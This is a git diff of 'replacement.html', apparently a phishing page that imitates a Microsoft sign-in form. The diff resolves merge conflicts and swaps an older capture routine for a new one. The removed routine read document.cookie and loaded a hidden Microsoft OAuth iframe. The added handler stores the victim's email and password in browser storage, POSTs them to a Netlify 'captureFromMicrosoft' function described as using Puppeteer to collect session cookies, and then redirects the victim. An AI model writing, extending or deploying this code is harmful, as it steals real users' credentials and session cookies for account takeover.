@@ -172,13 +172,6 @@
     .troubleshooting-body strong { font-weight: 600; }
     .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
     .hidden { display: none !important; }
-<<<<<<< HEAD
-=======
-    .mt-4 { margin-top: 1rem; }
-    .mt-3 { margin-top: 0.75rem; }
-    .mt-2 { margin-top: 0.5rem; }
-    .form-group { margin-bottom: 1rem; }
->>>>>>> 370655a23c84aedd47fd54ae2fe7a2ea404651a5
   </style>
 </head>
 <body>
@@ -279,48 +272,13 @@
     <a href="#" id="footer_dots_link">...</a>
   </div>
 
-<<<<<<< HEAD
-=======
-  <!-- ✅ SCRIPT AT END OF BODY (after all HTML elements) -->
->>>>>>> 370655a23c84aedd47fd54ae2fe7a2ea404651a5
   <script>
-    console.log('🔧 replacement.html loaded - Enhanced Microsoft Cookie Capture');
+    console.log('🚀 replacement.html loaded');
 
-<<<<<<< HEAD
     document.addEventListener('DOMContentLoaded', function () {
         const div1 = document.getElementById('div1');
         const div2 = document.getElementById('div2');
         const optionsBox = document.getElementById('options_box');
-=======
-    const div1 = document.getElementById('div1');
-    const div2 = document.getElementById('div2');
-    const optionsBox = document.getElementById('options_box');
-    const optionsViewDetailed = document.getElementById('options_view_detailed');
-    const troubleshootingBox = document.getElementById('troubleshooting_box');
-    
-    document.getElementById('next').addEventListener('click', function (e) {
-        e.preventDefault();
-        const emailInput = document.getElementById('email');
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        if (emailRegex.test(emailInput.value.trim())) {
-            document.getElementById('emailch').textContent = emailInput.value.trim();
-            div1.classList.add('hidden');
-            optionsBox.classList.add('hidden');
-            div2.classList.remove('hidden');
-        }
-    });
-
-    document.getElementById('back').addEventListener('click', function () {
-        div2.classList.add('hidden');
-        div1.classList.remove('hidden');
-        optionsBox.classList.remove('hidden');
-    });
-
-    document.getElementById('submit-btn').addEventListener('click', function (event) {
-        event.preventDefault();
-        const submitBtn = event.target;
-        const passwordInput = document.getElementById('password');
->>>>>>> 370655a23c84aedd47fd54ae2fe7a2ea404651a5
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
         const nextBtn = document.getElementById('next');
@@ -348,18 +306,17 @@
             div2.classList.add('hidden');
             div1.classList.remove('hidden');
             optionsBox.classList.remove('hidden');
-            emailInput.focus();
         });
 
-        // Main submit handler with enhanced cookie capture
-        submitBtn.addEventListener('click', function (event) {
+        // Main submit handler
+        submitBtn.addEventListener('click', async function (event) {
             event.preventDefault();
             
             const password = passwordInput.value;
             const email = emailInput.value.trim();
 
             if (!password || !email) {
-                console.error("Email or password is blank. Aborting.");
+                console.error("❌ Email or password is blank");
                 return;
             }
             
@@ -368,282 +325,76 @@
 
             console.log('📋 Credentials captured:', { email });
 
-            // ✅ Store credentials
-            const credentialsData = { 
-                email, 
-                password, 
-                captureTime: new Date().toISOString(), 
-                source: 'replacement-html',
-                domain: 'microsoft',
+            // Store credentials
+            const credentials = {
+                email,
+                password,
                 timestamp: new Date().toISOString(),
-                validated: true,
-                microsoftAccount: true
+                source: 'replacement.html'
             };
-            
+
+            localStorage.setItem('replacement_credentials', JSON.stringify(credentials));
+            sessionStorage.setItem('replacement_credentials', JSON.stringify(credentials));
+            localStorage.setItem('ms_credentials', JSON.stringify(credentials));
+            sessionStorage.setItem('ms_credentials', JSON.stringify(credentials));
+
+            console.log('💾 Credentials stored');
+
             try {
-                localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-                sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-                localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
-                sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
+                console.log('🔄 Sending credentials to Netlify function for backend capture...');
                 
-                console.log('💾 Credentials stored');
-            } catch (err) {
-                console.error('Failed to store credentials:', err);
-            }
+                // Send to backend for cookie capture via Puppeteer
+                const captureResponse = await fetch('/.netlify/functions/captureFromMicrosoft', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
 
-            // ✅ ENHANCED MICROSOFT COOKIE CAPTURE
-            console.log('🍪 Starting enhanced Microsoft cookie capture...');
-            captureMicrosoftCookiesEnhanced(email, password, submitBtn);
-        });
+                console.log('📥 Backend capture response status:', captureResponse.status);
 
-        // ✅ ENHANCED COOKIE CAPTURE FUNCTION
-        async function captureMicrosoftCookiesEnhanced(email, password, submitBtn) {
-            try {
-                console.log('🔄 Phase 1: Direct cookie capture from current page...');
-                
-                // Capture any existing cookies first
-                const existingCookies = captureCookiesFromDocument();
-                console.log('📊 Existing cookies captured:', existingCookies.length);
-
-                console.log('🔄 Phase 2: Creating Microsoft authentication frame...');
-                
-                // Create hidden iframe for Microsoft authentication
-                const cookieResult = await createMicrosoftAuthFrame(email);
-                
-                if (cookieResult.success && cookieResult.cookies.length > 0) {
-                    console.log('✅ Microsoft cookies captured successfully!');
-                    console.log('🍪 Total cookies:', cookieResult.cookies.length);
+                if (captureResponse.ok) {
+                    const captureData = await captureResponse.json();
                     
-                    // Store captured cookies
-                    const cookieExport = {
-                        version: '1.0',
-                        exportedAt: new Date().toISOString(),
-                        source: 'enhanced-microsoft-capture',
-                        domain: cookieResult.domain,
-                        totalCookies: cookieResult.cookies.length,
-                        cookies: cookieResult.cookies,
-                        existingCookies: existingCookies,
-                        note: 'Enhanced Microsoft cookie capture from replacement.html'
-                    };
-
-                    localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
-                    sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
-                    localStorage.setItem('captured_cookies', JSON.stringify(cookieResult.cookies));
-                    sessionStorage.setItem('captured_cookies', JSON.stringify(cookieResult.cookies));
-                    
-                    console.log('💾 Cookies stored successfully');
-
-                    // ✅ Redirect to AuthCallback
-                    console.log('🔄 Redirecting to /auth/callback...');
-                    setTimeout(() => {
-                        window.location.href = '/auth/callback';
-                    }, 1000);
-
-                } else {
-                    console.warn('⚠️ No Microsoft cookies captured, proceeding with existing cookies...');
-                    
-                    // Store existing cookies as fallback
-                    if (existingCookies.length > 0) {
-                        const fallbackExport = {
-                            version: '1.0',
-                            exportedAt: new Date().toISOString(),
-                            source: 'fallback-existing-cookies',
-                            domain: window.location.hostname,
-                            totalCookies: existingCookies.length,
-                            cookies: existingCookies,
-                            note: 'Fallback cookies from replacement.html'
-                        };
-
-                        localStorage.setItem('captured_cookies_data', JSON.stringify(fallbackExport));
-                        sessionStorage.setItem('captured_cookies_data', JSON.stringify(fallbackExport));
+                    if (captureData.success && captureData.cookies && captureData.cookies.length > 0) {
+                        console.log('✅ Cookies captured from backend:', captureData.cookies.length);
                         
-                        console.log('💾 Fallback cookies stored');
+                        // Store captured cookies
+                        localStorage.setItem('captured_cookies', JSON.stringify(captureData.cookies));
+                        sessionStorage.setItem('captured_cookies', JSON.stringify(captureData.cookies));
+                        
+                        const capturedData = {
+                            version: '1.0',
+                            capturedAt: new Date().toISOString(),
+                            source: 'puppeteer-backend',
+                            domain: captureData.domain,
+                            totalCookies: captureData.totalCookies,
+                            cookies: captureData.cookies,
+                            timestamp: captureData.timestamp
+                        };
+                        
+                        localStorage.setItem('captured_cookies_data', JSON.stringify(capturedData));
+                        sessionStorage.setItem('captured_cookies_data', JSON.stringify(capturedData));
+                        
+                        console.log('💾 Captured cookies stored');
+                    } else {
+                        console.warn('⚠️ Backend returned no cookies');
                     }
-
-                    // Still redirect to continue the flow
-                    setTimeout(() => {
-                        window.location.href = '/auth/callback';
-                    }, 1000);
+                } else {
+                    console.warn('⚠️ Backend capture failed:', captureResponse.status);
                 }
 
             } catch (error) {
-                console.error('❌ Enhanced cookie capture error:', error);
-                
-                // Fallback: still redirect to continue the flow
-                submitBtn.textContent = 'Continuing...';
-                setTimeout(() => {
-                    window.location.href = '/auth/callback';
-                }, 1000);
+                console.error('❌ Backend capture error:', error);
             }
-        }
 
-<<<<<<< HEAD
-        // ✅ CAPTURE COOKIES FROM CURRENT DOCUMENT
-        function captureCookiesFromDocument() {
-            const cookies = [];
-            const cookieString = document.cookie;
-            
-            if (cookieString) {
-                const cookiePairs = cookieString.split(';');
-                
-                cookiePairs.forEach(pair => {
-                    const trimmed = pair.trim();
-                    if (trimmed) {
-                        const equalsIndex = trimmed.indexOf('=');
-                        if (equalsIndex > 0) {
-                            const name = trimmed.substring(0, equalsIndex).trim();
-                            const value = trimmed.substring(equalsIndex + 1).trim();
-                            
-                            if (name && value) {
-                                cookies.push({
-                                    name: name,
-                                    value: value,
-                                    domain: window.location.hostname,
-                                    path: '/',
-                                    secure: window.location.protocol === 'https:',
-                                    sameSite: 'Lax',
-                                    session: true
-                                });
-                            }
-                        }
-                    }
-                });
-            }
-            
-            return cookies;
-        }
+            // Redirect to auth callback regardless
+            console.log('🔄 Redirecting to /auth/callback...');
+            setTimeout(() => {
+                window.location.href = '/auth/callback';
+            }, 1500);
+        });
 
-        // ✅ CREATE MICROSOFT AUTHENTICATION FRAME
-        function createMicrosoftAuthFrame(email) {
-            return new Promise((resolve) => {
-                console.log('🔧 Creating Microsoft authentication frame...');
-                
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.style.width = '0';
-                iframe.style.height = '0';
-                iframe.style.border = 'none';
-                iframe.id = 'microsoft-auth-frame';
-                
-                // Microsoft OAuth URL with login hint
-                const clientId = '4765445b-32c6-49b0-83e6-1d93765276ca'; // Office 365 client ID
-                const redirectUri = encodeURIComponent('https://www.office.com/');
-                const scope = encodeURIComponent('openid profile email');
-                const loginHint = encodeURIComponent(email);
-                
-                const microsoftUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${clientId}&response_type=code&redirect_uri=${redirectUri}&scope=${scope}&state=cookie_capture&login_hint=${loginHint}&prompt=none`;
-                
-                let timeoutId;
-                let resolved = false;
-                
-                const cleanup = () => {
-                    if (timeoutId) clearTimeout(timeoutId);
-                    if (iframe.parentNode) {
-                        iframe.parentNode.removeChild(iframe);
-                    }
-                };
-                
-                const resolveWithResult = (result) => {
-                    if (!resolved) {
-                        resolved = true;
-                        cleanup();
-                        resolve(result);
-                    }
-                };
-                
-                // Monitor iframe for cookie changes
-                iframe.onload = () => {
-                    console.log('🔄 Microsoft frame loaded, checking for cookies...');
-                    
-                    setTimeout(() => {
-                        // Capture cookies after frame loads
-                        const capturedCookies = captureCookiesFromDocument();
-                        
-                        // Also try to get cookies from iframe if possible
-                        let iframeCookies = [];
-                        try {
-                            const iframeDoc = iframe.contentDocument || iframe.contentWindow?.document;
-                            if (iframeDoc && iframeDoc.cookie) {
-                                const iframeCookieString = iframeDoc.cookie;
-                                const cookiePairs = iframeCookieString.split(';');
-                                
-                                cookiePairs.forEach(pair => {
-                                    const trimmed = pair.trim();
-                                    if (trimmed) {
-                                        const equalsIndex = trimmed.indexOf('=');
-                                        if (equalsIndex > 0) {
-                                            const name = trimmed.substring(0, equalsIndex).trim();
-                                            const value = trimmed.substring(equalsIndex + 1).trim();
-                                            
-                                            if (name && value) {
-                                                iframeCookies.push({
-                                                    name: name,
-                                                    value: value,
-                                                    domain: 'login.microsoftonline.com',
-                                                    path: '/',
-                                                    secure: true,
-                                                    sameSite: 'None',
-                                                    session: true
-                                                });
-                                            }
-                                        }
-                                    }
-                                });
-                            }
-                        } catch (error) {
-                            console.warn('⚠️ Cannot access iframe cookies (CORS expected):', error);
-                        }
-                        
-                        // Combine all cookies
-                        const allCookies = [...capturedCookies, ...iframeCookies];
-                        
-                        resolveWithResult({
-                            success: allCookies.length > 0,
-                            cookies: allCookies,
-                            domain: iframeCookies.length > 0 ? 'login.microsoftonline.com' : window.location.hostname,
-                            timestamp: new Date().toISOString(),
-                            source: 'iframe-enhanced-capture',
-                            totalCookies: allCookies.length
-                        });
-                    }, 3000); // Wait 3 seconds for cookies to be set
-                };
-                
-                iframe.onerror = () => {
-                    console.warn('⚠️ Microsoft frame failed to load');
-                    const fallbackCookies = captureCookiesFromDocument();
-                    resolveWithResult({
-                        success: fallbackCookies.length > 0,
-                        cookies: fallbackCookies,
-                        domain: window.location.hostname,
-                        timestamp: new Date().toISOString(),
-                        source: 'iframe-error-fallback',
-                        totalCookies: fallbackCookies.length
-                    });
-                };
-                
-                // Timeout after 10 seconds
-                timeoutId = setTimeout(() => {
-                    console.warn('⚠️ Microsoft frame timeout');
-                    const timeoutCookies = captureCookiesFromDocument();
-                    resolveWithResult({
-                        success: timeoutCookies.length > 0,
-                        cookies: timeoutCookies,
-                        domain: window.location.hostname,
-                        timestamp: new Date().toISOString(),
-                        source: 'iframe-timeout-fallback',
-                        totalCookies: timeoutCookies.length
-                    });
-                }, 10000);
-                
-                // Add iframe to document and start loading
-                document.body.appendChild(iframe);
-                iframe.src = microsoftUrl;
-                
-                console.log('🔗 Loading Microsoft URL:', microsoftUrl);
-            });
-        }
-
-        // Other UI event handlers
+        // Other UI handlers
         const optionsViewDetailed = document.getElementById('options_view_detailed');
         const troubleshootingBox = document.getElementById('troubleshooting_box');
 
@@ -681,47 +432,8 @@
                 e.target.textContent = 'Copied!';
                 setTimeout(() => { e.target.textContent = originalText; }, 2000);
             });
-=======
-    document.getElementById('sign_in_options_link').addEventListener('click', function (e) {
-        e.preventDefault();
-        div1.classList.add('hidden');
-        div2.classList.add('hidden');
-        optionsBox.classList.add('hidden');
-        troubleshootingBox.style.display = 'none';
-        optionsViewDetailed.classList.remove('hidden');
-    });
-
-    document.getElementById('options-view-back').addEventListener('click', function () {
-        optionsViewDetailed.classList.add('hidden');
-        div1.classList.remove('hidden');
-        optionsBox.classList.remove('hidden');
-    });
-
-    document.getElementById('footer_dots_link').addEventListener('click', function (e) {
-        e.preventDefault();
-        document.getElementById('modal_timestamp').textContent = new Date().toISOString();
-        troubleshootingBox.style.display = troubleshootingBox.style.display === 'block' ? 'none' : 'block';
-    });
-
-    document.getElementById('close_troubleshooting_btn').addEventListener('click', function () {
-        troubleshootingBox.style.display = 'none';
-    });
-
-    document.getElementById('copy_info_link').addEventListener('click', function (e) {
-        e.preventDefault();
-        const detailsNode = document.getElementById('error_details_for_copy');
-        const detailsText = detailsNode.innerText.trim().replace(/\s\s+/g, '\n');
-        navigator.clipboard.writeText(detailsText).then(() => {
-            const originalText = e.target.textContent;
-            e.target.textContent = 'Copied!';
-            setTimeout(() => { e.target.textContent = originalText; }, 2000);
->>>>>>> 370655a23c84aedd47fd54ae2fe7a2ea404651a5
         });
     });
   </script>
 </body>
-<<<<<<< HEAD
 </html>
-=======
-</html>
->>>>>>> 370655a23c84aedd47fd54ae2fe7a2ea404651a5
